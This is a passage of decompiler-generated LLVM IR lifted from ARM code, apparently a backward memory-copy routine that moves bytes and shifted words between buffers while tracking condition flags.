  store i1 %v8_feb8, i1* %cpsr_v.global-to-local, align 1
  %v9_feb8 = icmp slt i32 %v4_feb8, 0
  store i1 %v9_feb8, i1* %cpsr_n.global-to-local, align 1
  %v5_febc = icmp slt i32 %v0_fec8.pr, -16
  br i1 %v5_febc, label %.thread13, label %bb139

bb139:                                            ; preds = %dec_label_pc_feb8
  %v6_febc = load i32, i32* @r1, align 4
  %v7_febc = add i32 %v6_febc, -4
  %v8_febc = inttoptr i32 %v7_febc to i32*
  %v9_febc = load i32, i32* %v8_febc, align 4
  store i32 %v9_febc, i32* @r3, align 4
  %v10_febc = add i32 %v6_febc, -8
  %v11_febc = inttoptr i32 %v10_febc to i32*
  %v12_febc = load i32, i32* %v11_febc, align 4
  store i32 %v12_febc, i32* %r4.global-to-local, align 4
  %v13_febc = add i32 %v6_febc, -12
  %v14_febc = inttoptr i32 %v13_febc to i32*
  %v15_febc = load i32, i32* %v14_febc, align 4
  store i32 %v15_febc, i32* @ip, align 4
  %v16_febc = add i32 %v6_febc, -16
  %v17_febc = inttoptr i32 %v16_febc to i32*
  %v18_febc = load i32, i32* %v17_febc, align 4
  store i32 %v18_febc, i32* %lr.global-to-local, align 4
  store i32 %v16_febc, i32* @r1, align 4
  %v7_fec0 = add i32 %v6_fec0, -16
  %v8_fec0 = inttoptr i32 %v7_fec0 to i32*
  store i32 %v9_febc, i32* %v8_fec0, align 4
  %v10_fec0 = add i32 %v6_fec0, -12
  %v11_fec0 = inttoptr i32 %v10_fec0 to i32*
  %v12_fec0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_fec0, i32* %v11_fec0, align 4
  %v13_fec0 = add i32 %v6_fec0, -8
  %v14_fec0 = inttoptr i32 %v13_fec0 to i32*
  %v15_fec0 = load i32, i32* @ip, align 4
  store i32 %v15_fec0, i32* %v14_fec0, align 4
  %v16_fec0 = add i32 %v6_fec0, -4
  %v17_fec0 = inttoptr i32 %v16_fec0 to i32*
  %v18_fec0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_fec0, i32* %v17_fec0, align 4
  store i32 %v7_fec0, i32* %r0.global-to-local, align 4
  %v6_fec4 = load i32, i32* %r2.global-to-local, align 4
  %v7_fec4 = add i32 %v6_fec4, -16
  store i32 %v7_fec4, i32* %r2.global-to-local, align 4
  br label %.thread13

.thread13:                                        ; preds = %dec_label_pc_feb8, %bb139
  %v6_fed0 = phi i32 [ %v7_fec0, %bb139 ], [ %v6_fec0, %dec_label_pc_feb8 ]
  %v0_fec8 = phi i32 [ %v7_fec4, %bb139 ], [ %v0_fec8.pr, %dec_label_pc_feb8 ]
  %v4_fec8 = add i32 %v0_fec8, 20
  store i32 %v4_fec8, i32* %r2.global-to-local, align 4
  %v6_fec8 = sub i32 0, %v0_fec8
  %v7_fec8 = and i32 %v4_fec8, %v6_fec8
  %v8_fec8 = icmp slt i32 %v7_fec8, 0
  store i1 %v8_fec8, i1* %cpsr_v.global-to-local, align 1
  %v9_fec8 = icmp slt i32 %v4_fec8, 0
  store i1 %v9_fec8, i1* %cpsr_n.global-to-local, align 1
  %v5_fecc = icmp slt i32 %v0_fec8, -20
  br i1 %v5_fecc, label %.thread15, label %bb140

bb140:                                            ; preds = %.thread13
  %v6_fecc = load i32, i32* @r1, align 4
  %v7_fecc = add i32 %v6_fecc, -4
  %v8_fecc = inttoptr i32 %v7_fecc to i32*
  %v9_fecc = load i32, i32* %v8_fecc, align 4
  store i32 %v9_fecc, i32* @r3, align 4
  %v10_fecc = add i32 %v6_fecc, -8
  %v11_fecc = inttoptr i32 %v10_fecc to i32*
  %v12_fecc = load i32, i32* %v11_fecc, align 4
  store i32 %v12_fecc, i32* @ip, align 4
  %v13_fecc = add i32 %v6_fecc, -12
  %v14_fecc = inttoptr i32 %v13_fecc to i32*
  %v15_fecc = load i32, i32* %v14_fecc, align 4
  store i32 %v15_fecc, i32* %lr.global-to-local, align 4
  store i32 %v13_fecc, i32* @r1, align 4
  %v7_fed0 = add i32 %v6_fed0, -12
  %v8_fed0 = inttoptr i32 %v7_fed0 to i32*
  store i32 %v9_fecc, i32* %v8_fed0, align 4
  %v10_fed0 = add i32 %v6_fed0, -8
  %v11_fed0 = inttoptr i32 %v10_fed0 to i32*
  %v12_fed0 = load i32, i32* @ip, align 4
  store i32 %v12_fed0, i32* %v11_fed0, align 4
  %v13_fed0 = add i32 %v6_fed0, -4
  %v14_fed0 = inttoptr i32 %v13_fed0 to i32*
  %v15_fed0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_fed0, i32* %v14_fed0, align 4
  store i32 %v7_fed0, i32* %r0.global-to-local, align 4
  %v6_fed4 = load i32, i32* %r2.global-to-local, align 4
  %v7_fed4 = add i32 %v6_fed4, -12
  store i32 %v7_fed4, i32* %r2.global-to-local, align 4
  br label %.thread15

.thread15:                                        ; preds = %.thread13, %bb140
  %v6_fef456 = phi i32 [ %v6_fed0, %.thread13 ], [ %v7_fed0, %bb140 ]
  %v0_fedc54 = phi i32 [ %v4_fec8, %.thread13 ], [ %v7_fed4, %bb140 ]
  %v2_fed8 = load i8*, i8** %stack_var_-8, align 4
  %v3_fed8 = ptrtoint i8* %v2_fed8 to i32
  store i32 %v3_fed8, i32* @r4, align 4
  store i32 %v8_fe94, i32* @lr, align 4
  br label %dec_label_pc_fedc

dec_label_pc_fedc:                                ; preds = %dec_label_pc_fe8c, %.thread15
  %v7_feec = phi i32 [ %v0_fea448, %dec_label_pc_fe8c ], [ %v6_fef456, %.thread15 ]
  %v0_fedc = phi i32 [ %v2_fe8c, %dec_label_pc_fe8c ], [ %v0_fedc54, %.thread15 ]
  %v2_fedc = add i32 %v0_fedc, 8
  store i32 %v2_fedc, i32* %r2.global-to-local, align 4
  %v4_fedc = sub i32 0, %v0_fedc
  %v5_fedc = and i32 %v2_fedc, %v4_fedc
  %v6_fedc = icmp slt i32 %v5_fedc, 0
  store i1 %v6_fedc, i1* %cpsr_v.global-to-local, align 1
  %v7_fedc = icmp slt i32 %v2_fedc, 0
  store i1 %v7_fedc, i1* %cpsr_n.global-to-local, align 1
  %v5_fee0 = icmp slt i32 %v0_fedc, -8
  br i1 %v5_fee0, label %bb142, label %dec_label_pc_fee4

dec_label_pc_fee4:                                ; preds = %dec_label_pc_fedc
  %v6_fee4 = add i32 %v0_fedc, 4
  store i32 %v6_fee4, i32* %r2.global-to-local, align 4
  %v8_fee4 = sub i32 -5, %v0_fedc
  %v9_fee4 = and i32 %v8_fee4, %v2_fedc
  %v10_fee4 = icmp slt i32 %v9_fee4, 0
  store i1 %v10_fee4, i1* %cpsr_v.global-to-local, align 1
  %v11_fee4 = icmp slt i32 %v6_fee4, 0
  store i1 %v11_fee4, i1* %cpsr_n.global-to-local, align 1
  %v5_fee8 = icmp slt i32 %v2_fedc, 4
  %v6_fee8 = load i32, i32* @r1, align 4
  %v7_fee8 = add i32 %v6_fee8, -4
  %v8_fee8 = inttoptr i32 %v7_fee8 to i32*
  %v9_fee8 = load i32, i32* %v8_fee8, align 4
  store i32 %v9_fee8, i32* @r3, align 4
  br i1 %v5_fee8, label %.thread19, label %bb141

.thread19:                                        ; preds = %dec_label_pc_fee4
  store i32 %v7_fee8, i32* @r1, align 4
  %v8_feec = add i32 %v7_feec, -4
  %v9_feec = inttoptr i32 %v8_feec to i32*
  store i32 %v9_fee8, i32* %v9_feec, align 4
  %v10_feec = load i32, i32* %r0.global-to-local, align 4
  %v11_feec = add i32 %v10_feec, -4
  store i32 %v11_feec, i32* %r0.global-to-local, align 4
  %v0_fefc.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb142

bb141:                                            ; preds = %dec_label_pc_fee4
  %v10_fef0 = add i32 %v6_fee8, -8
  %v11_fef0 = inttoptr i32 %v10_fef0 to i32*
  %v12_fef0 = load i32, i32* %v11_fef0, align 4
  store i32 %v12_fef0, i32* @ip, align 4
  store i32 %v10_fef0, i32* @r1, align 4
  %v7_fef4 = add i32 %v7_feec, -8
  %v8_fef4 = inttoptr i32 %v7_fef4 to i32*
  store i32 %v9_fee8, i32* %v8_fef4, align 4
  %v10_fef4 = add i32 %v7_feec, -4
  %v11_fef4 = inttoptr i32 %v10_fef4 to i32*
  %v12_fef4 = load i32, i32* @ip, align 4
  store i32 %v12_fef4, i32* %v11_fef4, align 4
  store i32 %v7_fef4, i32* %r0.global-to-local, align 4
  %v6_fef8 = load i32, i32* %r2.global-to-local, align 4
  %v7_fef8 = add i32 %v6_fef8, -4
  store i32 %v7_fef8, i32* %r2.global-to-local, align 4
  br label %bb142

bb142:                                            ; preds = %.thread19, %.thread25, %dec_label_pc_fedc, %dec_label_pc_fe6c, %dec_label_pc_100a0, %dec_label_pc_10034, %dec_label_pc_ffc8, %bb141
  %v2_ff00 = phi i32 [ %v11_feec, %.thread19 ], [ %v0_ff9831, %.thread25 ], [ %v7_feec, %dec_label_pc_fedc ], [ %v2_fe70, %dec_label_pc_fe6c ], [ %v2_ff0c64, %dec_label_pc_100a0 ], [ %v2_ff0c63, %dec_label_pc_10034 ], [ %v2_ff0c62, %dec_label_pc_ffc8 ], [ %v7_fef4, %bb141 ]
  %v0_fefc = phi i32 [ %v0_fefc.pre, %.thread19 ], [ %v2_ff40, %.thread25 ], [ %v2_fedc, %dec_label_pc_fedc ], [ %v2_fe74, %dec_label_pc_fe6c ], [ %v0_fefc60, %dec_label_pc_100a0 ], [ %v0_fefc59, %dec_label_pc_10034 ], [ %v0_fefc58, %dec_label_pc_ffc8 ], [ %v7_fef8, %bb141 ]
  %v1_fefc = add i32 %v0_fefc, 4
  store i32 %v1_fefc, i32* @r2, align 4
  %v3_fefc = sub i32 0, %v0_fefc
  %v4_fefc = and i32 %v1_fefc, %v3_fefc
  %v5_fefc = icmp slt i32 %v4_fefc, 0
  store i1 %v5_fefc, i1* %cpsr_v.global-to-local, align 1
  %v6_fefc = icmp slt i32 %v1_fefc, 0
  store i1 %v6_fefc, i1* %cpsr_n.global-to-local, align 1
  %v7_fefc = icmp eq i32 %v1_fefc, 0
  store i1 %v7_fefc, i1* @cpsr_z, align 1
  br i1 %v7_fefc, label %.thread122, label %bb143

bb143:                                            ; preds = %bb142
  %v1_ff04 = add i32 %v0_fefc, 2
  %v3_ff04 = sub i32 -3, %v0_fefc
  %v4_ff04 = and i32 %v3_ff04, %v1_fefc
  %v5_ff04 = icmp slt i32 %v4_ff04, 0
  store i1 %v5_ff04, i1* %cpsr_v.global-to-local, align 1
  %v6_ff04 = icmp slt i32 %v1_ff04, 0
  store i1 %v6_ff04, i1* %cpsr_n.global-to-local, align 1
  %v7_ff04 = icmp eq i32 %v1_fefc, 2
  store i1 %v7_ff04, i1* @cpsr_z, align 1
  %v0_ff08 = load i32, i32* @r1, align 4
  %v1_ff08 = add i32 %v0_ff08, -1
  %v2_ff08 = inttoptr i32 %v1_ff08 to i8*
  %v3_ff08 = load i8, i8* %v2_ff08, align 1
  %v4_ff08 = zext i8 %v3_ff08 to i32
  store i32 %v4_ff08, i32* @r3, align 4
  store i32 %v1_ff08, i32* @r1, align 4
  %v3_ff0c = add i32 %v2_ff00, -1
  %v4_ff0c = inttoptr i32 %v3_ff0c to i8*
  store i8 %v3_ff08, i8* %v4_ff0c, align 1
  %v5_ff0c = load i32, i32* %r0.global-to-local, align 4
  %v6_ff0c = add i32 %v5_ff0c, -1
  store i32 %v6_ff0c, i32* %r0.global-to-local, align 4
  %v0_ff10 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_ff10 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_ff10 = xor i1 %v0_ff10, %v1_ff10
  br i1 %v2_ff10, label %.thread121, label %bb144

bb144:                                            ; preds = %bb143
  %v3_ff10 = load i32, i32* @r1, align 4
  %v4_ff10 = add i32 %v3_ff10, -1
  %v5_ff10 = inttoptr i32 %v4_ff10 to i8*
  %v6_ff10 = load i8, i8* %v5_ff10, align 1
  %v7_ff10 = zext i8 %v6_ff10 to i32
  store i32 %v7_ff10, i32* @r3, align 4
  store i32 %v4_ff10, i32* @r1, align 4
  %v6_ff14 = add i32 %v5_ff0c, -2
  %v7_ff14 = inttoptr i32 %v6_ff14 to i8*
  store i8 %v6_ff10, i8* %v7_ff14, align 1
  %v8_ff14 = load i32, i32* %r0.global-to-local, align 4
  %v9_ff14 = add i32 %v8_ff14, -1
  store i32 %v9_ff14, i32* %r0.global-to-local, align 4
  %v1_ff18.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_ff18.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread121

.thread121:                                       ; preds = %bb143, %bb144
  %v7_ff1c = phi i32 [ %v9_ff14, %bb144 ], [ %v6_ff0c, %bb143 ]
  %v2_ff1c = phi i1 [ %v2_ff18.pre, %bb144 ], [ %v1_ff10, %bb143 ]
  %v1_ff1c = phi i1 [ %v1_ff18.pre, %bb144 ], [ %v0_ff10, %bb143 ]
  %v0_ff18 = load i1, i1* @cpsr_z, align 1
  %v3_ff18 = xor i1 %v2_ff1c, %v1_ff1c
  %v4_ff18 = or i1 %v0_ff18, %v3_ff18
  br i1 %v4_ff18, label %.thread122, label %bb145

bb145:                                            ; preds = %.thread121
  %v5_ff18 = load i32, i32* @r1, align 4
  %v6_ff18 = add i32 %v5_ff18, -1
  %v7_ff18 = inttoptr i32 %v6_ff18 to i8*
  %v8_ff18 = load i8, i8* %v7_ff18, align 1
  %v9_ff18 = zext i8 %v8_ff18 to i32
  store i32 %v9_ff18, i32* @r3, align 4
  store i32 %v6_ff18, i32* @r1, align 4
  %v8_ff1c = add i32 %v7_ff1c, -1
  %v9_ff1c = inttoptr i32 %v8_ff1c to i8*
  store i8 %v8_ff18, i8* %v9_ff1c, align 1
  %v10_ff1c = load i32, i32* %r0.global-to-local, align 4
  %v11_ff1c = add i32 %v10_ff1c, -1
  store i32 %v11_ff1c, i32* %r0.global-to-local, align 4
  br label %.thread122

dec_label_pc_ff24:                                ; preds = %dec_label_pc_fe7c
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_ff24 = icmp eq i32 %v1_fe7c, 1
  store i1 %v8_ff24, i1* %cpsr_n.global-to-local, align 1
  %v1_ff28 = add i32 %v2_fe6c, -1
  %v2_ff28 = inttoptr i32 %v1_ff28 to i8*
  %v3_ff28 = load i8, i8* %v2_ff28, align 1
  %v4_ff28 = zext i8 %v3_ff28 to i32
  store i32 %v4_ff28, i32* @r3, align 4
  store i32 %v1_ff28, i32* @r1, align 4
  %v3_ff2c = add i32 %v2_fe70, -1
  %v4_ff2c = inttoptr i32 %v3_ff2c to i8*
  store i8 %v3_ff28, i8* %v4_ff2c, align 1
  %v5_ff2c = load i32, i32* %r0.global-to-local, align 4
  %v6_ff2c = add i32 %v5_ff2c, -1
  store i32 %v6_ff2c, i32* %r0.global-to-local, align 4
  br i1 %v8_ff24, label %.thread25, label %bb146

bb146:                                            ; preds = %dec_label_pc_ff24
  %v9_ff24 = icmp eq i32 %v1_fe7c, 2
  %v6_ff30 = load i32, i32* @r1, align 4
  %v7_ff30 = add i32 %v6_ff30, -1
  %v8_ff30 = inttoptr i32 %v7_ff30 to i8*
  %v9_ff30 = load i8, i8* %v8_ff30, align 1
  %v10_ff30 = zext i8 %v9_ff30 to i32
  store i32 %v10_ff30, i32* @r3, align 4
  store i32 %v7_ff30, i32* @r1, align 4
  %v9_ff34 = add i32 %v5_ff2c, -2
  %v10_ff34 = inttoptr i32 %v9_ff34 to i8*
  store i8 %v9_ff30, i8* %v10_ff34, align 1
  %v11_ff34 = load i32, i32* %r0.global-to-local, align 4
  %v12_ff34 = add i32 %v11_ff34, -1
  store i32 %v12_ff34, i32* %r0.global-to-local, align 4
  br i1 %v9_ff24, label %.thread25, label %bb147

bb147:                                            ; preds = %bb146
  %v8_ff38 = load i32, i32* @r1, align 4
  %v9_ff38 = add i32 %v8_ff38, -1
  %v10_ff38 = inttoptr i32 %v9_ff38 to i8*
  %v11_ff38 = load i8, i8* %v10_ff38, align 1
  %v12_ff38 = zext i8 %v11_ff38 to i32
  store i32 %v12_ff38, i32* @r3, align 4
  store i32 %v9_ff38, i32* @r1, align 4
  %v11_ff3c = add i32 %v11_ff34, -2
  %v12_ff3c = inttoptr i32 %v11_ff3c to i8*
  store i8 %v11_ff38, i8* %v12_ff3c, align 1
  %v13_ff3c = load i32, i32* %r0.global-to-local, align 4
  %v14_ff3c = add i32 %v13_ff3c, -1
  store i32 %v14_ff3c, i32* %r0.global-to-local, align 4
  br label %.thread25

.thread25:                                        ; preds = %bb146, %dec_label_pc_ff24, %bb147
  %v0_ff9831 = phi i32 [ %v12_ff34, %bb146 ], [ %v6_ff2c, %dec_label_pc_ff24 ], [ %v14_ff3c, %bb147 ]
  %v0_ff40 = load i32, i32* %r2.global-to-local, align 4
  %v1_ff40 = load i32, i32* @ip, align 4
  %v2_ff40 = sub i32 %v0_ff40, %v1_ff40
  store i32 %v2_ff40, i32* %r2.global-to-local, align 4
  %v4_ff40 = xor i32 %v1_ff40, %v0_ff40
  %v5_ff40 = xor i32 %v2_ff40, %v0_ff40
  %v6_ff40 = and i32 %v5_ff40, %v4_ff40
  %v7_ff40 = icmp slt i32 %v6_ff40, 0
  store i1 %v7_ff40, i1* %cpsr_v.global-to-local, align 1
  %v8_ff40 = icmp slt i32 %v2_ff40, 0
  store i1 %v8_ff40, i1* %cpsr_n.global-to-local, align 1
  %v5_ff44 = icmp slt i32 %v0_ff40, %v1_ff40
  br i1 %v5_ff44, label %bb142, label %dec_label_pc_ff48

dec_label_pc_ff48:                                ; preds = %.thread25
  %v0_ff48 = load i32, i32* @r1, align 4
  %v1_ff48 = urem i32 %v0_ff48, 4
  store i32 %v1_ff48, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_ff48 = icmp eq i32 %v1_ff48, 0
  br i1 %v2_ff48, label %dec_label_pc_fe8c, label %dec_label_pc_ff50

dec_label_pc_ff50:                                ; preds = %dec_label_pc_fe84, %dec_label_pc_ff48
  %v0_ff9830 = phi i32 [ %v2_fe70, %dec_label_pc_fe84 ], [ %v0_ff9831, %dec_label_pc_ff48 ]
  %v0_10044 = phi i32 [ %v2_fe74, %dec_label_pc_fe84 ], [ %v2_ff40, %dec_label_pc_ff48 ]
  %v0_ff50 = phi i32 [ %v2_fe6c, %dec_label_pc_fe84 ], [ %v0_ff48, %dec_label_pc_ff48 ]
  %v0_ff58 = phi i32 [ %v1_fe84, %dec_label_pc_fe84 ], [ %v1_ff48, %dec_label_pc_ff48 ]
  %v1_ff50 = and i32 %v0_ff50, -4
  store i32 %v1_ff50, i32* %r1.global-to-local, align 4
  %v1_ff54 = inttoptr i32 %v1_ff50 to i32*
  %v2_ff54 = load i32, i32* %v1_ff54, align 4
  store i32 %v2_ff54, i32* @r3, align 4
  %v7_ff58 = icmp ult i32 %v0_ff58, 2
  %v2_1003c = add i32 %v0_10044, -12
  %v4_1003c = sub i32 11, %v0_10044
  %v5_1003c = and i32 %v4_1003c, %v0_10044
  %v6_1003c = icmp slt i32 %v5_1003c, 0
  store i1 %v6_1003c, i1* %cpsr_v.global-to-local, align 1
  %v7_1003c = icmp slt i32 %v2_1003c, 0
  store i1 %v7_1003c, i1* %cpsr_n.global-to-local, align 1
  %v5_10040 = icmp slt i32 %v0_10044, 12
  br i1 %v7_ff58, label %dec_label_pc_1003c, label %dec_label_pc_ff60

dec_label_pc_ff60:                                ; preds = %dec_label_pc_ff50
  %v8_ff58 = icmp eq i32 %v0_ff58, 2
  br i1 %v8_ff58, label %dec_label_pc_ffd0, label %dec_label_pc_ff64

dec_label_pc_ff64:                                ; preds = %dec_label_pc_ff60
  br i1 %v5_10040, label %dec_label_pc_ffb0, label %dec_label_pc_ff6c

dec_label_pc_ff6c:                                ; preds = %dec_label_pc_ff64
  store i32 %v2_1003c, i32* %r2.global-to-local, align 4
  %v3_ff70 = load i32, i32* @r4, align 4
  store i32 %v3_ff70, i32* %stack_var_-12, align 4
  %v6_ff70 = load i32, i32* @r5, align 4
  %v8_ff70 = inttoptr i32 %v6_ff70 to i8*
  store i8* %v8_ff70, i8** %stack_var_-8, align 4
  %v11_ff70 = load i32, i32* @lr, align 4
  br label %dec_label_pc_ff74

dec_label_pc_ff74:                                ; preds = %dec_label_pc_ff74.dec_label_pc_ff74_crit_edge, %dec_label_pc_ff6c
  %v0_ff98 = phi i32 [ %v1_ff98, %dec_label_pc_ff74.dec_label_pc_ff74_crit_edge ], [ %v0_ff9830, %dec_label_pc_ff6c ]
  %v0_ff78 = phi i32 [ %v0_ff78.pre, %dec_label_pc_ff74.dec_label_pc_ff74_crit_edge ], [ %v1_ff50, %dec_label_pc_ff6c ]
  %v0_ff74 = phi i32 [ %v0_ff74.pre, %dec_label_pc_ff74.dec_label_pc_ff74_crit_edge ], [ %v2_ff54, %dec_label_pc_ff6c ]
  %v3_ff74 = mul i32 %v0_ff74, 256
  store i32 %v3_ff74, i32* %lr.global-to-local, align 4
  %v1_ff78 = add i32 %v0_ff78, -4
  %v2_ff78 = inttoptr i32 %v1_ff78 to i32*
  %v3_ff78 = load i32, i32* %v2_ff78, align 4
  store i32 %v3_ff78, i32* @r3, align 4
  %v4_ff78 = add i32 %v0_ff78, -8
  %v5_ff78 = inttoptr i32 %v4_ff78 to i32*
  %v6_ff78 = load i32, i32* %v5_ff78, align 4
  store i32 %v6_ff78, i32* %r4.global-to-local, align 4
  %v7_ff78 = add i32 %v0_ff78, -12
  %v8_ff78 = inttoptr i32 %v7_ff78 to i32*
  %v9_ff78 = load i32, i32* %v8_ff78, align 4
  store i32 %v9_ff78, i32* %r5.global-to-local, align 4
  %v10_ff78 = add i32 %v0_ff78, -16
  %v11_ff78 = inttoptr i32 %v10_ff78 to i32*
  %v12_ff78 = load i32, i32* %v11_ff78, align 4
  store i32 %v10_ff78, i32* %r1.global-to-local, align 4
  %v4_ff7c = udiv i32 %v12_ff78, 16777216
  %v5_ff7c = or i32 %v4_ff7c, %v3_ff74
  store i32 %v5_ff7c, i32* %lr.global-to-local, align 4
  %v3_ff80 = mul i32 %v12_ff78, 256
  %v4_ff84 = udiv i32 %v9_ff78, 16777216
  %v5_ff84 = or i32 %v3_ff80, %v4_ff84
  store i32 %v5_ff84, i32* @ip, align 4
  %v3_ff88 = mul i32 %v9_ff78, 256
  %v4_ff8c = udiv i32 %v6_ff78, 16777216
  %v5_ff8c = or i32 %v3_ff88, %v4_ff8c
  store i32 %v5_ff8c, i32* %r5.global-to-local, align 4
  %v3_ff90 = mul i32 %v6_ff78, 256
  %v4_ff94 = udiv i32 %v3_ff78, 16777216
  %v5_ff94 = or i32 %v3_ff90, %v4_ff94
  store i32 %v5_ff94, i32* %r4.global-to-local, align 4
  %v1_ff98 = add i32 %v0_ff98, -16
  %v2_ff98 = inttoptr i32 %v1_ff98 to i32*
  store i32 %v5_ff94, i32* %v2_ff98, align 4
  %v4_ff98 = add i32 %v0_ff98, -12
  %v5_ff98 = inttoptr i32 %v4_ff98 to i32*
  %v6_ff98 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_ff98, i32* %v5_ff98, align 4
  %v7_ff98 = add i32 %v0_ff98, -8
  %v8_ff98 = inttoptr i32 %v7_ff98 to i32*
  %v9_ff98 = load i32, i32* @ip, align 4
  store i32 %v9_ff98, i32* %v8_ff98, align 4
  %v10_ff98 = add i32 %v0_ff98, -4
  %v11_ff98 = inttoptr i32 %v10_ff98 to i32*
  %v12_ff98 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_ff98, i32* %v11_ff98, align 4
  store i32 %v1_ff98, i32* %r0.global-to-local, align 4
  %v0_ff9c = load i32, i32* %r2.global-to-local, align 4
  %v2_ff9c = add i32 %v0_ff9c, -16
  store i32 %v2_ff9c, i32* %r2.global-to-local, align 4
  %v6_ffa0 = icmp slt i32 %v0_ff9c, 16
  br i1 %v6_ffa0, label %dec_label_pc_ffa4, label %dec_label_pc_ff74.dec_label_pc_ff74_crit_edge

dec_label_pc_ff74.dec_label_pc_ff74_crit_edge:    ; preds = %dec_label_pc_ff74
  %v0_ff74.pre = load i32, i32* @r3, align 4
  %v0_ff78.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_ff74

dec_label_pc_ffa4:                                ; preds = %dec_label_pc_ff74
  %v2_ffa4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_ffa4, i32* @r4, align 4
  %v5_ffa4 = load i8*, i8** %stack_var_-8, align 4
  %v6_ffa4 = ptrtoint i8* %v5_ffa4 to i32
  store i32 %v6_ffa4, i32* @r5, align 4
  store i32 %v11_ff70, i32* @lr, align 4
  %v2_ffa8 = add i32 %v0_ff9c, -4
  store i32 %v2_ffa8, i32* %r2.global-to-local, align 4
  %v4_ffa8 = add i32 %v0_ff9c, 2147483632
  %v5_ffa8 = and i32 %v2_ffa8, %v4_ffa8
  %v6_ffa8 = icmp slt i32 %v5_ffa8, 0
  store i1 %v6_ffa8, i1* %cpsr_v.global-to-local, align 1
  %v7_ffa8 = icmp slt i32 %v2_ffa8, 0
  store i1 %v7_ffa8, i1* %cpsr_n.global-to-local, align 1
  %v5_ffac = icmp slt i32 %v2_ff9c, -12
  br i1 %v5_ffac, label %dec_label_pc_ffc8, label %dec_label_pc_ffb0

dec_label_pc_ffb0:                                ; preds = %dec_label_pc_ffa4, %dec_label_pc_ff64, %dec_label_pc_ffb0
  %v1_ffbc = phi i32 [ %v5_ffbc, %dec_label_pc_ffb0 ], [ %v1_ff98, %dec_label_pc_ffa4 ], [ %v0_ff9830, %dec_label_pc_ff64 ]
  %v0_ffb0 = load i32, i32* @r3, align 4
  %v3_ffb0 = mul i32 %v0_ffb0, 256
  store i32 %v3_ffb0, i32* %ip.global-to-local, align 4
  %v0_ffb4 = load i32, i32* %r1.global-to-local, align 4
  %v1_ffb4 = add i32 %v0_ffb4, -4
  %v2_ffb4 = inttoptr i32 %v1_ffb4 to i32*
  %v3_ffb4 = load i32, i32* %v2_ffb4, align 4
  store i32 %v3_ffb4, i32* @r3, align 4
  store i32 %v1_ffb4, i32* %r1.global-to-local, align 4
  %v4_ffb8 = udiv i32 %v3_ffb4, 16777216
  %v5_ffb8 = or i32 %v4_ffb8, %v3_ffb0
  store i32 %v5_ffb8, i32* @ip, align 4
  %v2_ffbc = add i32 %v1_ffbc, -4
  %v3_ffbc = inttoptr i32 %v2_ffbc to i32*
  store i32 %v5_ffb8, i32* %v3_ffbc, align 4
  %v4_ffbc = load i32, i32* %r0.global-to-local, align 4
  %v5_ffbc = add i32 %v4_ffbc, -4
  store i32 %v5_ffbc, i32* %r0.global-to-local, align 4
  %v0_ffc0 = load i32, i32* %r2.global-to-local, align 4
  %v2_ffc0 = add i32 %v0_ffc0, -4
  store i32 %v2_ffc0, i32* %r2.global-to-local, align 4
  %v6_ffc4 = icmp slt i32 %v0_ffc0, 4
  br i1 %v6_ffc4, label %dec_label_pc_ffc8.loopexit, label %dec_label_pc_ffb0

dec_label_pc_ffc8.loopexit:                       ; preds = %dec_label_pc_ffb0
  %v4_ffc0 = sub i32 3, %v0_ffc0
  %v5_ffc0 = and i32 %v4_ffc0, %v0_ffc0
  %v6_ffc0 = icmp slt i32 %v5_ffc0, 0
  %v7_ffc0 = icmp slt i32 %v2_ffc0, 0
  store i1 %v6_ffc0, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_ffc0, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_ffc8

dec_label_pc_ffc8:                                ; preds = %dec_label_pc_ffc8.loopexit, %dec_label_pc_ffa4
  %v2_ff0c62 = phi i32 [ %v5_ffbc, %dec_label_pc_ffc8.loopexit ], [ %v1_ff98, %dec_label_pc_ffa4 ]
  %v0_fefc58 = phi i32 [ %v2_ffc0, %dec_label_pc_ffc8.loopexit ], [ %v2_ffa8, %dec_label_pc_ffa4 ]
  %v0_ffc8 = load i32, i32* %r1.global-to-local, align 4
  %v1_ffc8 = add i32 %v0_ffc8, 3
  store i32 %v1_ffc8, i32* @r1, align 4
  br label %bb142

dec_label_pc_ffd0:                                ; preds = %dec_label_pc_ff60
  br i1 %v5_10040, label %dec_label_pc_1001c, label %dec_label_pc_ffd8

dec_label_pc_ffd8:                                ; preds = %dec_label_pc_ffd0
  store i32 %v2_1003c, i32* %r2.global-to-local, align 4
  %v3_ffdc = load i32, i32* @r4, align 4
  store i32 %v3_ffdc, i32* %stack_var_-12, align 4
  %v6_ffdc = load i32, i32* @r5, align 4
  %v8_ffdc = inttoptr i32 %v6_ffdc to i8*
  store i8* %v8_ffdc, i8** %stack_var_-8, align 4
  %v11_ffdc = load i32, i32* @lr, align 4
  br label %dec_label_pc_ffe0

dec_label_pc_ffe0:                                ; preds = %dec_label_pc_ffe0.dec_label_pc_ffe0_crit_edge, %dec_label_pc_ffd8
  %v0_10004 = phi i32 [ %v1_10004, %dec_label_pc_ffe0.dec_label_pc_ffe0_crit_edge ], [ %v0_ff9830, %dec_label_pc_ffd8 ]
  %v0_ffe4 = phi i32 [ %v0_ffe4.pre, %dec_label_pc_ffe0.dec_label_pc_ffe0_crit_edge ], [ %v1_ff50, %dec_label_pc_ffd8 ]
  %v0_ffe0 = phi i32 [ %v0_ffe0.pre, %dec_label_pc_ffe0.dec_label_pc_ffe0_crit_edge ], [ %v2_ff54, %dec_label_pc_ffd8 ]
  %v3_ffe0 = mul i32 %v0_ffe0, 65536
  store i32 %v3_ffe0, i32* %lr.global-to-local, align 4
  %v1_ffe4 = add i32 %v0_ffe4, -4
  %v2_ffe4 = inttoptr i32 %v1_ffe4 to i32*
  %v3_ffe4 = load i32, i32* %v2_ffe4, align 4
  store i32 %v3_ffe4, i32* @r3, align 4
